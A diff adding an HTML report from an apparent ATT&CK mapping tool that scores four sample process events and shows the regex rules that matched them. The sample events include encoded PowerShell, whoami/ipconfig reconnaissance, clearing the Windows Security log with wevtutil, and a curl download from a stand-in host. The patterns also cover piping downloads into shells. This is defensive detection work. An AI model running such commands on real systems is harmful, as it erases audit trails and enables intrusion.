@@ -1,0 +1,409 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>BLACKTERM // MITRE MAPPER</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      --bg: #080b10;
+      --panel: #10151d;
+      --panel-2: #151c27;
+      --text: #e8edf5;
+      --muted: #8e9bad;
+      --accent: #b778ff;
+      --cyan: #4de3ff;
+      --border: #273244;
+      --critical: #ff4d6d;
+      --high: #ff8a4c;
+      --medium: #ffd166;
+      --low: #4de3ff;
+      --info: #8e9bad;
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      background:
+        radial-gradient(circle at top right, rgba(183,120,255,.12), transparent 35%),
+        var(--bg);
+      color: var(--text);
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, sans-serif;
+      line-height: 1.5;
+    }
+    main { max-width: 1180px; margin: 0 auto; padding: 42px 24px 80px; }
+    header { margin-bottom: 30px; }
+    .eyebrow { color: var(--accent); letter-spacing: .18em; font-weight: 700; font-size: .78rem; }
+    h1 { margin: 8px 0; font-size: clamp(2rem, 5vw, 4.1rem); }
+    .subtitle { color: var(--muted); max-width: 760px; }
+    .stats { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 14px; margin: 30px 0; }
+    .stat, .event, .mapping {
+      background: rgba(16, 21, 29, .92);
+      border: 1px solid var(--border);
+      border-radius: 14px;
+    }
+    .stat { padding: 18px; }
+    .stat strong { display: block; font-size: 1.8rem; color: var(--cyan); }
+    .stat span { color: var(--muted); }
+    .event { padding: 22px; margin-top: 18px; }
+    .event-head { display: flex; justify-content: space-between; gap: 16px; align-items: flex-start; }
+    .risk { font-size: 1.8rem; font-weight: 800; }
+    .muted { color: var(--muted); }
+    .mapping { padding: 18px; margin-top: 14px; background: var(--panel-2); }
+    .mapping-head { display: flex; justify-content: space-between; gap: 12px; }
+    .technique-id { color: var(--cyan); font-family: ui-monospace, monospace; }
+    .badge { border-radius: 999px; padding: 4px 10px; font-size: .75rem; font-weight: 800; text-transform: uppercase; }
+    .critical { color: var(--critical); border: 1px solid var(--critical); }
+    .high { color: var(--high); border: 1px solid var(--high); }
+    .medium { color: var(--medium); border: 1px solid var(--medium); }
+    .low { color: var(--low); border: 1px solid var(--low); }
+    .informational { color: var(--info); border: 1px solid var(--info); }
+    code, pre { font-family: ui-monospace, SFMono-Regular, Consolas, monospace; }
+    pre {
+      white-space: pre-wrap;
+      word-break: break-word;
+      padding: 14px;
+      background: #090d13;
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      overflow: auto;
+    }
+    ul { margin-bottom: 0; }
+    footer { color: var(--muted); margin-top: 34px; font-size: .85rem; }
+    @media (max-width: 720px) {
+      .stats { grid-template-columns: 1fr; }
+      .event-head, .mapping-head { flex-direction: column; }
+    }
+  </style>
+</head>
+<body>
+<main>
+  <header>
+    <div class="eyebrow">BLACKTERM SECURITY RESEARCH</div>
+    <h1>MITRE MAPPER</h1>
+    <p class="subtitle">
+      ATT&amp;CK context generated from security telemetry using transparent,
+      reviewable mapping rules.
+    </p>
+  </header>
+
+  <section class="stats">
+    <div class="stat"><strong>4</strong><span>Events analyzed</span></div>
+    <div class="stat"><strong>6</strong><span>ATT&amp;CK mappings</span></div>
+    <div class="stat"><strong>86</strong><span>Highest risk score</span></div>
+  </section>
+
+  
+  <article class="event">
+    <div class="event-head">
+      <div>
+        <div class="eyebrow">EVENT 1</div>
+        <h2>205106784c053614</h2>
+        <div class="muted">examples\events\sample_events.jsonl</div>
+      </div>
+      <div>
+        <div class="risk">66/100</div>
+        <span class="badge high">high</span>
+      </div>
+    </div>
+
+    <details>
+      <summary>Raw event</summary>
+      <pre>{
+  "@timestamp": "2026-07-31T22:00:00Z",
+  "process": {
+    "command_line": "powershell.exe -enc SQBFAFgA",
+    "name": "powershell.exe"
+  },
+  "user": {
+    "name": "analyst"
+  }
+}</pre>
+    </details>
+
+    
+      
+      <section class="mapping">
+        <div class="mapping-head">
+          <div>
+            <div class="technique-id">T1059.001</div>
+            <h3>PowerShell</h3>
+          </div>
+          <span class="badge high">high</span>
+        </div>
+        <p>Detects PowerShell execution with encoded command arguments.</p>
+        <p>
+          <strong>Tactics:</strong> execution<br>
+          <strong>Confidence:</strong> 94%<br>
+          <strong>Rule:</strong> BT-T1059-001
+        </p>
+        <details>
+          <summary>Matched evidence</summary>
+          <ul>
+          
+            <li>
+              <code>process.command_line</code>
+              contains
+              <code>powershell</code>
+            </li>
+          
+            <li>
+              <code>process.command_line</code>
+              regex
+              <code>(?i)(?:^|\s)(?:-|/)(?:enc|encodedcommand)\b</code>
+            </li>
+          
+          </ul>
+        </details>
+      </section>
+      
+    
+  </article>
+  
+  <article class="event">
+    <div class="event-head">
+      <div>
+        <div class="eyebrow">EVENT 2</div>
+        <h2>6d299bb55faadc47</h2>
+        <div class="muted">examples\events\sample_events.jsonl</div>
+      </div>
+      <div>
+        <div class="risk">43/100</div>
+        <span class="badge medium">medium</span>
+      </div>
+    </div>
+
+    <details>
+      <summary>Raw event</summary>
+      <pre>{
+  "@timestamp": "2026-07-31T22:01:00Z",
+  "process": {
+    "command_line": "cmd.exe /c whoami \u0026\u0026 ipconfig /all",
+    "name": "cmd.exe"
+  }
+}</pre>
+    </details>
+
+    
+      
+      <section class="mapping">
+        <div class="mapping-head">
+          <div>
+            <div class="technique-id">T1059.003</div>
+            <h3>Windows Command Shell</h3>
+          </div>
+          <span class="badge medium">medium</span>
+        </div>
+        <p>Detects use of cmd.exe or common command-shell execution syntax.</p>
+        <p>
+          <strong>Tactics:</strong> execution<br>
+          <strong>Confidence:</strong> 77%<br>
+          <strong>Rule:</strong> BT-T1059-003
+        </p>
+        <details>
+          <summary>Matched evidence</summary>
+          <ul>
+          
+            <li>
+              <code>process.name</code>
+              endswith
+              <code>cmd.exe</code>
+            </li>
+          
+            <li>
+              <code>process.command_line</code>
+              regex
+              <code>(?i)\bcmd(?:\.exe)?\s+/[ck]\b</code>
+            </li>
+          
+          </ul>
+        </details>
+      </section>
+      
+      <section class="mapping">
+        <div class="mapping-head">
+          <div>
+            <div class="technique-id">T1033</div>
+            <h3>System Owner/User Discovery</h3>
+          </div>
+          <span class="badge low">low</span>
+        </div>
+        <p>Detects commands used to identify the current user.</p>
+        <p>
+          <strong>Tactics:</strong> discovery<br>
+          <strong>Confidence:</strong> 80%<br>
+          <strong>Rule:</strong> BT-T1033
+        </p>
+        <details>
+          <summary>Matched evidence</summary>
+          <ul>
+          
+            <li>
+              <code>process.command_line</code>
+              regex
+              <code>(?i)(?:^|\s)whoami(?:\.exe)?(?:\s|$)</code>
+            </li>
+          
+          </ul>
+        </details>
+      </section>
+      
+      <section class="mapping">
+        <div class="mapping-head">
+          <div>
+            <div class="technique-id">T1016</div>
+            <h3>System Network Configuration Discovery</h3>
+          </div>
+          <span class="badge low">low</span>
+        </div>
+        <p>Detects commands used to enumerate local network configuration.</p>
+        <p>
+          <strong>Tactics:</strong> discovery<br>
+          <strong>Confidence:</strong> 75%<br>
+          <strong>Rule:</strong> BT-T1016
+        </p>
+        <details>
+          <summary>Matched evidence</summary>
+          <ul>
+          
+            <li>
+              <code>process.command_line</code>
+              regex
+              <code>(?i)\bipconfig(?:\.exe)?\b</code>
+            </li>
+          
+          </ul>
+        </details>
+      </section>
+      
+    
+  </article>
+  
+  <article class="event">
+    <div class="event-head">
+      <div>
+        <div class="eyebrow">EVENT 3</div>
+        <h2>a6fdf28f11f175f7</h2>
+        <div class="muted">examples\events\sample_events.jsonl</div>
+      </div>
+      <div>
+        <div class="risk">86/100</div>
+        <span class="badge critical">critical</span>
+      </div>
+    </div>
+
+    <details>
+      <summary>Raw event</summary>
+      <pre>{
+  "@timestamp": "2026-07-31T22:02:00Z",
+  "process": {
+    "command_line": "wevtutil cl Security",
+    "name": "wevtutil.exe"
+  }
+}</pre>
+    </details>
+
+    
+      
+      <section class="mapping">
+        <div class="mapping-head">
+          <div>
+            <div class="technique-id">T1070.001</div>
+            <h3>Clear Windows Event Logs</h3>
+          </div>
+          <span class="badge critical">critical</span>
+        </div>
+        <p>Detects commands used to clear Windows event logs.</p>
+        <p>
+          <strong>Tactics:</strong> defense-evasion<br>
+          <strong>Confidence:</strong> 96%<br>
+          <strong>Rule:</strong> BT-T1070-001
+        </p>
+        <details>
+          <summary>Matched evidence</summary>
+          <ul>
+          
+            <li>
+              <code>process.command_line</code>
+              regex
+              <code>(?i)\bwevtutil(?:\.exe)?\s+(?:cl|clear-log)\b</code>
+            </li>
+          
+          </ul>
+        </details>
+      </section>
+      
+    
+  </article>
+  
+  <article class="event">
+    <div class="event-head">
+      <div>
+        <div class="eyebrow">EVENT 4</div>
+        <h2>0c981296c462d1a0</h2>
+        <div class="muted">examples\events\sample_events.jsonl</div>
+      </div>
+      <div>
+        <div class="risk">59/100</div>
+        <span class="badge high">high</span>
+      </div>
+    </div>
+
+    <details>
+      <summary>Raw event</summary>
+      <pre>{
+  "@timestamp": "2026-07-31T22:03:00Z",
+  "process": {
+    "command_line": "curl https://example.test/tool -o /tmp/tool",
+    "name": "curl"
+  }
+}</pre>
+    </details>
+
+    
+      
+      <section class="mapping">
+        <div class="mapping-head">
+          <div>
+            <div class="technique-id">T1105</div>
+            <h3>Ingress Tool Transfer</h3>
+          </div>
+          <span class="badge high">high</span>
+        </div>
+        <p>Detects curl downloading content to a local file or piping it to an interpreter.</p>
+        <p>
+          <strong>Tactics:</strong> command-and-control<br>
+          <strong>Confidence:</strong> 84%<br>
+          <strong>Rule:</strong> BT-T1105-CURL
+        </p>
+        <details>
+          <summary>Matched evidence</summary>
+          <ul>
+          
+            <li>
+              <code>process.command_line</code>
+              regex
+              <code>(?i)\bcurl(?:\.exe)?\b</code>
+            </li>
+          
+            <li>
+              <code>process.command_line</code>
+              regex
+              <code>(?i)(?:\s-o\s|\s--output\s|\|\s*(?:sh|bash|python|powershell)|https?://)</code>
+            </li>
+          
+          </ul>
+        </details>
+      </section>
+      
+    
+  </article>
+  
+
+  <footer>
+    ATT&amp;CK mappings require analyst review. This project is not affiliated with
+    or endorsed by MITRE.
+  </footer>
+</main>
+</body>
+</html>
